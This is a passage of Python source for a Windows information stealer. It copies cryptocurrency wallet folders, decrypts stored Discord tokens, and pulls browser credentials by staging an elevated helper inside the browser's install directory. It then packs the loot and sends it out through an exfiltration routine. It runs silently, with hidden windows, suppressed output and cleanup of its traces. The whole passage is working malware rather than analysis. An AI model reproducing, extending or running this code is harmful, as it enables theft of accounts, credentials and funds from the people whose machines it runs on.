        ("atomic",        os.path.join(ad,"atomic","Local Storage","leveldb")),
        ("coinomi",       os.path.join(ad,"Coinomi")),
        ("guarda",        os.path.join(ad,"Guarda")),
        ("wasabi",        os.path.join(ad,"WalletWasabi","Wallets")),
        ("bitcoin",       os.path.join(ad,"Bitcoin","wallet.dat")),
        ("monero",        os.path.join(ad,"Monero","wallets")),
        ("local_eth",     os.path.join(ld,"Ethereum")),
        ("zcash",         os.path.join(ad,"Zcash")),
    ]
    return [(n,p) for n,p in out if os.path.exists(p)]


def robocopy_tree(src, dst):
    os.makedirs(dst, exist_ok=True)
    subprocess.run(["robocopy",src,dst,"/E","/NJH","/NJS","/NDL","/NFL",
                    "/NC","/NS","/NP","/R:1","/W:1",
                    "/XD","Cache","Code Cache","GPUCache","blob_storage"],
                   capture_output=True, creationflags=0x08000000)


def collect_extras(dest):
    manifest = []
    for label, path in extra_sources():
        target = os.path.join(dest, label)
        try:
            if os.path.isdir(path):  robocopy_tree(path, target)
            else:
                os.makedirs(dest, exist_ok=True)
                subprocess.run(["robocopy",os.path.dirname(path),dest,
                                os.path.basename(path),"/NJH","/NJS","/NDL",
                                "/NFL","/NC","/NS","/NP","/R:1","/W:1"],
                               capture_output=True, creationflags=0x08000000)
                target = os.path.join(dest, os.path.basename(path))
        except: continue
        n = size = 0
        if os.path.isdir(target):
            for root,_d,files in os.walk(target):
                for f in files:
                    try: size+=os.path.getsize(os.path.join(root,f)); n+=1
                    except: pass
        elif os.path.isfile(target):
            n,size = 1,os.path.getsize(target)
        if n:
            manifest.append((label,path,n,size))
        time.sleep(0.2)
    return manifest


def _valid_token(t):
    if t.startswith("mfa."): return len(t)>80
    parts = t.split(".")
    if len(parts)!=3: return False
    try:
        uid = base64.b64decode(parts[0]+"="*(-len(parts[0])%4)).decode()
    except: return False
    return uid.isdigit() and 15<=len(uid)<=21


def discord_keys():
    keys = []
    ad = os.environ.get("APPDATA","")
    for app in ("discord","discordcanary","discordptb"):
        try:
            ls  = json.loads(open(os.path.join(ad,app,"Local State"),"rb").read())
            raw = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            k   = dpapi(raw[5:] if raw[:5]==b"DPAPI" else raw)
            if k: keys.append(k)
        except: continue
    return keys


def scan_tokens(folder):
    import re
    enc   = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})")
    plain = re.compile(rb"(mfa\.[\w-]{70,100}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110})")
    keys  = discord_keys()
    found = []
    for root,_d,files in os.walk(folder):
        for f in files:
            p = os.path.join(root,f)
            try:
                if os.path.getsize(p)>25*1024*1024: continue
                data = open(p,"rb").read()
            except: continue
            for m in enc.finditer(data):
                try:    raw = base64.b64decode(m.group(1))
                except: continue
                tok = None
                if raw[:3] in (b"v10",b"v20") and keys:
                    for k in keys:
                        try: tok=aes()(k).decrypt(raw[3:15],raw[15:],None); break
                        except: continue
                if tok is None: tok = dpapi(raw, b"dQw4w9WgXcQ")
                if tok: found.append(("v10" if raw[:3]==b"v10" else "dpapi",
                                      tok.decode("utf-8","replace").strip()))
            for m in plain.finditer(data):
                try: found.append(("plain",m.group(1).decode("utf-8","replace")))
                except: pass
    seen,out = set(),[]
    for kind,tok in found:
        if tok and tok not in seen and _valid_token(tok):
            seen.add(tok); out.append((kind,tok))
    return out


def legacy_key_raw(user_data):
    try:
        ls  = json.loads(open(os.path.join(user_data,"Local State"),"rb").read())
        raw = base64.b64decode(ls["os_crypt"]["encrypted_key"])
        return dpapi(raw[5:] if raw[:5]==b"DPAPI" else raw)
    except: return None


def legacy_user_data_exists(cfg):
    return os.path.isdir(cfg["user_data"])


def run_browser_legacy(cfg_key):
    cfg = BROWSERS_LEGACY[cfg_key]
    ud  = cfg["user_data"]
    if not os.path.isdir(ud):
        return None

    lk = legacy_key_raw(ud)
    if not lk:
        return None

    close_browser(cfg["exe"])

    report_dir = os.path.join(tempfile.gettempdir(),
                              "cache_%d_%s" % (os.getpid(), cfg_key))
    records = []
    try:
        for prof in sorted(os.listdir(ud)):
            pdir = os.path.join(ud, prof)
            if not os.path.isdir(pdir): continue
            dest = os.path.join(tempfile.gettempdir(),
                                "h%d_%s_%s" % (os.getpid(),
                                               cfg["name"].replace(" ",""), prof))
            shutil.rmtree(dest, ignore_errors=True)
            for alias, real in stash(pdir, dest).items():
                n = sweep(os.path.join(dest, alias), None, lk,
                          "%s/%s/%s" % (cfg["name"], prof, real), records)
            shutil.rmtree(dest, ignore_errors=True)

        if records:
            write_report(records, report_dir)
            return report_dir
        return None
    finally:
        exe_path = _find_legacy_exe(cfg)
        if exe_path:
            subprocess.Popen([exe_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)


def _find_legacy_exe(cfg):
    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        try:
            with winreg.OpenKey(hive, cfg.get("uninstall",""), 0,
                                winreg.KEY_READ|winreg.KEY_WOW64_64KEY) as k:
                loc = winreg.QueryValueEx(k,"InstallLocation")[0]
                p   = os.path.join(loc, cfg["exe"])
                if os.path.isfile(p): return p
        except: pass
    if cfg.get("sm_key"):
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, cfg["sm_key"], 0,
                                winreg.KEY_READ|winreg.KEY_WOW64_64KEY) as k:
                cmd = winreg.QueryValueEx(k,"")[0].strip('"').split('"')[0]
                if os.path.isfile(cmd): return cmd
        except: pass
    return None


def run_browser(cfg_key):
    cfg = BROWSERS[cfg_key]
    install_dir = find_install_dir(cfg)
    if not install_dir:
        return False

    staged_exe = os.path.join(install_dir, cfg["stage_name"])
    elevate("--stage-only %s" % cfg_key)
    if not wait_for(staged_exe, True, 30):
        return False

    subprocess.call([staged_exe, os.path.abspath(__file__), "--stage2", cfg_key],
                    env=dict(os.environ, PYTHONHOME=sys.prefix), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)

    elevate("--unstage-only %s" % cfg_key)
    wait_for(staged_exe, False, 30)

    keyfile = KEYFILE + "." + cfg_key
    if not os.path.exists(keyfile):
        return False

    abe = open(keyfile,"rb").read(); os.remove(keyfile)
    lk  = legacy_key(cfg)

    if not close_browser(cfg["exe"]):
        return False

    report_dir = os.path.join(tempfile.gettempdir(),
                              "cache_%d_%s" % (os.getpid(), cfg_key))
    try:
        records = harvest(cfg, abe, lk)
        write_report(records, report_dir)
        return report_dir if records else None
    finally:
        subprocess.Popen([os.path.join(install_dir,cfg["exe"])],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)


def run():
    all_report_dirs = []
    all_records_any = False

    extras_dir = os.path.join(tempfile.gettempdir(),"cache_%d_extras" % os.getpid())
    manifest   = collect_extras(extras_dir)
    tokens     = scan_tokens(extras_dir)

    for cfg_key in BROWSERS:
        result = run_browser(cfg_key)
        if isinstance(result, str):
            all_report_dirs.append(result)
            all_records_any = True

    summary_dir = all_report_dirs[0] if all_report_dirs else \
                  os.path.join(tempfile.gettempdir(),"cache_%d_summary"%os.getpid())
    os.makedirs(summary_dir, exist_ok=True)
    with open(os.path.join(summary_dir,"discord_tokens.txt"),"w",encoding="utf-8") as f:
        for kind,tok in tokens: f.write("%s\t%s\n"%(kind,tok))
    with open(os.path.join(summary_dir,"wallets.txt"),"w",encoding="utf-8") as f:
        for label,path,n,size in manifest:
            f.write("%s\t%s\t%d files\t%d bytes\n"%(label,path,n,size))

    all_dirs = all_report_dirs + ([extras_dir] if os.path.isdir(extras_dir) else [])
    if all_dirs or tokens or manifest:
        payload       = pack(all_dirs)
        sent, total   = exfil(payload)
        if total and sent==total:
            cleanup(all_report_dirs + [extras_dir, summary_dir])
    return 0


def main():
    if "--stage-only" in sys.argv:
        idx = sys.argv.index("--stage-only")
        key = sys.argv[idx+1] if idx+1 < len(sys.argv) else None
        if not key or key not in BROWSERS: return 1
        cfg = BROWSERS[key]
        d   = find_install_dir(cfg)
        if not d: return 1
        stage(cfg, d)
        return 0

    if "--unstage-only" in sys.argv:
        idx = sys.argv.index("--unstage-only")
        key = sys.argv[idx+1] if idx+1 < len(sys.argv) else None
        if key and key in BROWSERS:
            cfg = BROWSERS[key]
            d   = find_install_dir(cfg)
            if d: unstage(cfg, d)
        return 0

    if "--stage2" in sys.argv:
        idx = sys.argv.index("--stage2")
        key = sys.argv[idx+1] if idx+1 < len(sys.argv) else None
        if not key or key not in BROWSERS: return 1
        cfg = BROWSERS[key]
        key_data = com_key(cfg)
        if key_data:
            open(KEYFILE+"."+key,"wb").write(key_data)
        if cfg.get("aster"):
            aster = com_key_aster(cfg)
            if aster:
                open(KEYFILE+"."+key+".aster","wb").write(aster)
        return 0 if key_data else 1

    return run()


if __name__ == "__main__":
    # Nuke all console output completely
    import sys
    import os
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    try:
        sys.exit(main())
    except Exception:
        sys.exit(0)
